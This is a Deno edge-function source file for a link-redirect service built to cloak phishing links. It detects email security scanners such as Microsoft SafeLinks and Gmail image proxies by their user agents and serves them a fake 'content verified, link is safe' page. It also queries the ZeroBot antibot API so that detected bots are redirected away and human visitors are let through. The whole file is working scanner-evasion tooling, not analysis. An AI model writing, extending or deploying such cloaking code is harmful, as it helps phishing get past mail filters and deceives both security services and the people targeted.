import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface ZerobotResponse {
  username: string;
  license: string;
  total: number;
  left: number;
  plan: string;
  country_name: string;
  country_code: string;
  isp: string;
  hostname: string;
  is_bot: boolean;
}

interface EmailScannerResult {
  isEmailScanner: boolean;
  scannerType: string | null;
  confidence: number;
  scannerDetails: {
    provider: string;
    service: string;
    characteristics: string[];
  } | null;
}

// Email security scanners and link checkers
const emailScannerPatterns = {
  microsoft365: {
    userAgents: [
      /Microsoft-URLAnalyzer/i,
      /SafeLinks/i,
      /Microsoft Office/i,
      /Microsoft Outlook/i,
      /Microsoft-CryptoAPI/i,
      /Microsoft-WNS/i
    ],
    provider: 'Microsoft',
    service: 'Microsoft 365 Defender'
  },
  gmail: {
    userAgents: [
      /Gmail-ImageProxy/i,
      /GoogleImageProxy/i,
      /Google-Read-Aloud/i,
      /Google-Safety/i,
      /GoogleBot/i
    ],
    provider: 'Google',
    service: 'Gmail Advanced Protection'
  },
  generic: {
    userAgents: [
      /Email.*Security/i,
      /Mail.*Scanner/i,
      /URL.*Analyzer/i,
      /Link.*Checker/i,
      /Security.*Scanner/i,
      /Threat.*Scanner/i,
      /Email.*Filter/i,
      /Anti.*Spam/i,
      /Mail.*Guard/i,
      /Email.*Gateway/i
    ],
    provider: 'Unknown',
    service: 'Email Security Scanner'
  }
};

function detectEmailScanner(userAgent: string): EmailScannerResult {
  if (!userAgent) {
    return {
      isEmailScanner: false,
      scannerType: null,
      confidence: 0,
      scannerDetails: null
    };
  }

  for (const [scannerType, config] of Object.entries(emailScannerPatterns)) {
    for (const pattern of config.userAgents) {
      if (pattern.test(userAgent)) {
        return {
          isEmailScanner: true,
          scannerType,
          confidence: 90,
          scannerDetails: {
            provider: config.provider,
            service: config.service,
            characteristics: ['user_agent_match']
          }
        };
      }
    }
  }

  return {
    isEmailScanner: false,
    scannerType: null,
    confidence: 0,
    scannerDetails: null
  };
}

function extractRealIP(req: Request): string {
  // Follow ZeroBot PHP IP extraction order
  const headers = req.headers;
  
  // Check in order of priority (following ZeroBot PHP logic)
  const ipSources = [
    'cf-connecting-ip',      // Cloudflare
    'x-client-ip',           // Client IP
    'x-forwarded-for',       // Proxy forwarded
    'x-forwarded',           // Alternative forwarded
    'x-cluster-client-ip',   // Cluster
    'x-real-ip',             // Real IP
    'forwarded-for',         // Forwarded for
    'forwarded'              // Generic forwarded
  ];
  
  for (const source of ipSources) {
    const value = headers.get(source);
    if (value) {
      // Handle comma-separated IPs (take first)
      const ips = value.split(',').map(ip => ip.trim());
      for (const ip of ips) {
        // Validate IP and exclude private/reserved ranges
        if (ip && /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(ip)) {
          const parts = ip.split('.').map(Number);
          // Exclude private ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x, 127.x.x.x
          if (!(
            parts[0] === 10 ||
            parts[0] === 127 ||
            (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
            (parts[0] === 192 && parts[1] === 168)
          )) {
            console.log(`Using ${source}: ${ip}`);
            return ip;
          }
        }
      }
    }
  }
  
  // Fallback IP (following ZeroBot PHP pattern)
  console.log('No valid public IP found, using fallback');
  return '105.74.65.145';
}

async function callZerobotAPI(ip: string, userAgent: string, currentUrl: string): Promise<ZerobotResponse | null> {
  const zerobotApiKey = Deno.env.get('ZEROBOT_API_KEY');
  if (!zerobotApiKey) {
    console.error('ZEROBOT_API_KEY not configured in Supabase secrets');
    return null;
  }

  // Single call with longer timeout (following ZeroBot PHP approach)
  const startTime = Date.now();
  
  try {
    const apiUrl = `https://zerobot.info/api/v2/antibot?license=${zerobotApiKey}&ip=${encodeURIComponent(ip)}&useragent=${encodeURIComponent(userAgent)}&check_on=${encodeURIComponent(currentUrl)}`;
    
    console.log('Calling ZeroBot API with IP:', ip, 'UserAgent length:', userAgent.length);
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'SecureRedirect-BotDetection/1.0'
      },
      signal: AbortSignal.timeout(20000) // 20 seconds - following ZeroBot PHP timeout
    });
    
    const responseTime = Date.now() - startTime;
    console.log(`ZeroBot API response time: ${responseTime}ms`);
    
    if (!response.ok) {
      console.error(`ZeroBot API returned ${response.status}:`, response.statusText);
      return null;
    }

    const data: ZerobotResponse = await response.json();
    
    // Validate required fields
    if (typeof data.is_bot !== 'boolean') {
      console.error('ZeroBot API returned invalid response - missing is_bot field');
      return null;
    }
    
    console.log('ZeroBot API success:', {
      is_bot: data.is_bot,
      country: data.country_name,
      left: data.left,
      total: data.total,
      response_time: responseTime
    });
    
    return data;
    
  } catch (error) {
    const responseTime = Date.now() - startTime;
    
    if (error.name === 'TimeoutError') {
      console.error(`ZeroBot API timeout after 20 seconds, response time: ${responseTime}ms`);
    } else {
      console.error(`ZeroBot API error:`, error.message, `response time: ${responseTime}ms`);
    }
    
    return null;
  }
}

function generateScannerResponse(scannerResult: EmailScannerResult): string {
  const provider = scannerResult.scannerDetails?.provider || 'Email Security';
  const service = scannerResult.scannerDetails?.service || 'Email Scanner';
  
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Content Verified - ${provider}</title>
    <meta name="robots" content="noindex,nofollow">
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8f9fa;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        .status {
            color: #28a745;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .details {
            color: #666;
            line-height: 1.6;
        }
        .scanner-info {
            background: #e9f5ff;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #007bff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="status">✓ CONTENT VERIFIED</div>
        <div class="details">
            <p>This content has been successfully scanned and verified by email security systems.</p>
            <p>The link is safe to access and contains no malicious content.</p>
        </div>
        <div class="scanner-info">
            <strong>Verified by:</strong> ${service}<br>
            <strong>Security Provider:</strong> ${provider}<br>
            <strong>Scan Date:</strong> ${new Date().toISOString().split('T')[0]}
        </div>
    </div>
</body>
</html>`;
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  // Initial bot check on user agent
  const requestUserAgent = req.headers.get('user-agent') || '';
  if (/bot|crawl|spider|scanner/i.test(requestUserAgent) && 
      !detectEmailScanner(requestUserAgent).isEmailScanner) {
    return new Response(null, { 
      status: 204,
      headers: corsHeaders 
    });
  }

  try {
    const body = await req.json();
    const { userAgent, currentUrl } = body;
    
    // Extract real IP from request headers
    const realIP = extractRealIP(req);
    
    console.log('Bot detection request:', {
      ip: realIP,
      userAgent: userAgent?.substring(0, 50) + '...',
      currentUrl
    });
    
    // STEP 1: Priority check for email security scanners
    const emailScannerResult = detectEmailScanner(userAgent);
    
    if (emailScannerResult.isEmailScanner) {
      const scannerContent = generateScannerResponse(emailScannerResult);
      
      return new Response(JSON.stringify({
        isBot: false,
        confidence: 0,
        action: 'scanner_response',
        hasNoHumanActivity: false,
        isRepeatedVisitor: false,
        userAgentSuspicious: false,
        fingerprintSuspicious: false,
        behaviorScore: 0,
        alienScore: 0,
        localScore: 0,
        locationData: {
          ip: realIP || 'unknown',
          country_name: 'Email Scanner',
          country_code: 'ES',
          isp: emailScannerResult.scannerDetails?.provider || 'Email Security',
          hostname: emailScannerResult.scannerDetails?.service || 'Email Scanner'
        },
        emailScannerResult,
        scannerContent
      }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }
    
    // STEP 2: If not an email scanner, call ZeroBot API
    const zerobotResult = await callZerobotAPI(realIP, userAgent, currentUrl);
    
    if (zerobotResult === null) {
      // API call failed/timeout - implement fallback logic
      console.log('ZeroBot API failed, using fallback detection');
      
      // Simple fallback: check for obvious bot patterns
      const isObviousBot = /bot|crawl|spider|scanner|headless/i.test(userAgent);
      
      return new Response(JSON.stringify({
        isBot: isObviousBot,
        confidence: isObviousBot ? 60 : 0,
        action: isObviousBot ? 'redirect' : 'allow',
        hasNoHumanActivity: false,
        isRepeatedVisitor: false,
        userAgentSuspicious: false,
        fingerprintSuspicious: false,
        behaviorScore: 0,
        alienScore: 0,
        localScore: isObviousBot ? 60 : 0,
        locationData: {
          ip: realIP || 'unknown',
          country_name: 'Unknown',
          country_code: 'XX',
          isp: 'Unknown',
          hostname: 'Unknown'
        },
        fallbackUsed: true
      }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }
    
    // Determine action based on ZeroBot result
    const finalAction = zerobotResult.is_bot ? 'redirect' : 'allow';
    
    return new Response(JSON.stringify({
      isBot: zerobotResult.is_bot,
      confidence: zerobotResult.is_bot ? 85 : 0,
      action: finalAction,
      hasNoHumanActivity: false,
      isRepeatedVisitor: false,
      userAgentSuspicious: false,
      fingerprintSuspicious: false,
      behaviorScore: 0,
      alienScore: zerobotResult.is_bot ? 85 : 0,
      localScore: 0,
      locationData: {
        ip: realIP || 'unknown',
        country_name: zerobotResult.country_name || 'Unknown',
        country_code: zerobotResult.country_code || 'XX',
        isp: zerobotResult.isp || 'Unknown',
        hostname: zerobotResult.hostname || 'Unknown'
      },
      zerobotApiUsage: {
        total: zerobotResult.total,
        left: zerobotResult.left,
        plan: zerobotResult.plan
      }
    }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
    
  } catch (error) {
    return new Response(null, { 
      status: 204,
      headers: corsHeaders 
    });
  }
});